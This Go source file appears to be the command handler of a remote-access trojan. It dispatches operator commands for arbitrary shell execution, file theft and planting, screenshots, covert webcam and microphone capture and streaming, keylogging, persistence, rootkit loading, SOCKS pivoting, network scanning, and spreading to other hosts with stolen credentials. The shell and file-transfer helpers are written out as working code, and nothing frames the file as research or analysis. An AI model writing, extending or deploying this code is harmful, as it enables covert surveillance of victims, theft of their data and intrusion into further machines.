package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type fileEntry struct {
	Name string `json:"name"`
	Size int64  `json:"size"`
	Dir  bool   `json:"dir"`
}

func execute(c Cmd) Result {
	var r Result
	switch c.Type {

	// ---------- core ----------
	case "shell":
		r = runShell(str(c.Args["cmd"]))
	case "ls":
		r = listDir(str(c.Args["path"]))
	case "lsjson":
		r = lsjson(str(c.Args["path"]))
	case "cat":
		r = catFile(str(c.Args["path"]))
	case "sysinfo":
		b, _ := json.MarshalIndent(gatherHost(), "", "  ")
		r = Result{OK: true, Out: string(b)}
	case "ps":
		r = psList()

	// ---------- file transfer ----------
	case "download":
		r = download(str(c.Args["path"]))
	case "upload":
		r = upload(str(c.Args["path"]), str(c.Args["b64"]))

	// ---------- capture ----------
	case "screenshot":
		r = screenshot()
	case "webcam":
		r = webcam()
	case "mic":
		r = mic(atoi(c.Args["secs"], 3))

	// ---------- live streaming ----------
	case "cam_stream":
		if str(c.Args["sub"]) == "stop" {
			r = camStreamStop()
		} else {
			r = camStreamStart(atoi(c.Args["fps"], 2), atoi(c.Args["width"], 640),
				str(c.Args["device"]))
		}
	case "mic_stream":
		if str(c.Args["sub"]) == "stop" {
			r = micStreamStop()
		} else {
			r = micStreamStart(str(c.Args["device"]))
		}
	case "stream_status":
		r = streamStatus()

	// ---------- timing ----------
	case "sleep":
		s := atoi(c.Args["sleep"], 3)
		j := atoi(c.Args["jitter"], 20)
		setTiming(s, j)
		r = Result{OK: true, Out: "sleep set"}

	// ---------- persistence / evasion ----------
	case "persist":
		r = persist()
	case "rootkit":
		r = loadRootkit(c)
	case "kill":
		camStreamStop()
		micStreamStop()
		r = Result{OK: true, Out: "bye"}
		defer os.Exit(0)

	// ---------- pivoting ----------
	case "socks":
		startSocks()
		r = Result{OK: true, Out: "socks agent started"}

	// ---------- keylogging ----------
	case "keylog":
		switch str(c.Args["sub"]) {
		case "start":
			r = keylogStart(str(c.Args["device"]))
		case "dump":
			r = keylogDump(str(c.Args["clear"]) == "true")
		case "stop":
			r = keylogStop()
		default:
			r = Result{OK: false, Err: "sub must be start|dump|stop"}
		}

	// ---------- recon / lateral movement ----------
	case "scan":
		r = scanNet(str(c.Args["subnet"]), str(c.Args["ports"]))
	case "spread":
		r = spread(str(c.Args["targets"]), str(c.Args["user"]), str(c.Args["pass"]))

	// ---------- fallback ----------
	default:
		r = Result{OK: false, Err: "unknown: " + c.Type}
	}
	r.CmdID = c.ID
	return r
}

// runShell uses the platform shell: cmd on Windows, /bin/sh elsewhere.
func runShell(cmd string) Result {
	if cmd == "" {
		return Result{OK: true}
	}
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = newCmd("cmd", "/c", cmd)
	} else {
		c = newCmd("/bin/sh", "-c", cmd)
	}
	out, err := c.CombinedOutput()
	if err != nil {
		return Result{OK: false, Out: string(out), Err: err.Error()}
	}
	return Result{OK: true, Out: string(out)}
}

// listDir is a pure-Go ls so it works on any OS.
func listDir(path string) Result {
	if path == "" {
		path = "."
	}
	ents, err := os.ReadDir(path)
	if err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	var b strings.Builder
	for _, e := range ents {
		info, _ := e.Info()
		var sz int64
		kind := "-"
		if info != nil {
			sz = info.Size()
		}
		if e.IsDir() {
			kind = "d"
		}
		fmt.Fprintf(&b, "%s %10d  %s\n", kind, sz, e.Name())
	}
	return Result{OK: true, Out: b.String()}
}

// catFile is a pure-Go cat.
func catFile(path string) Result {
	b, err := os.ReadFile(path)
	if err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	return Result{OK: true, Out: string(b)}
}

func psList() Result {
	if runtime.GOOS == "windows" {
		return runShell("tasklist")
	}
	return runShell("ps aux")
}

func lsjson(path string) Result {
	if path == "" {
		path = "."
	}
	ents, err := os.ReadDir(path)
	if err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	var out []fileEntry
	for _, e := range ents {
		info, _ := e.Info()
		var sz int64
		if info != nil {
			sz = info.Size()
		}
		out = append(out, fileEntry{Name: e.Name(), Size: sz, Dir: e.IsDir()})
	}
	b, _ := json.Marshal(out)
	return Result{OK: true, Out: string(b)}
}

func download(path string) Result {
	b, err := os.ReadFile(path)
	if err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	return uploadResult("file", filepath.Base(path), b)
}

func upload(path, b64 string) Result {
	b, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return Result{OK: false, Err: "bad b64"}
	}
	if err := os.WriteFile(path, b, 0755); err != nil {
		return Result{OK: false, Err: err.Error()}
	}
	return Result{OK: true, Out: "wrote " + path}
}

func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}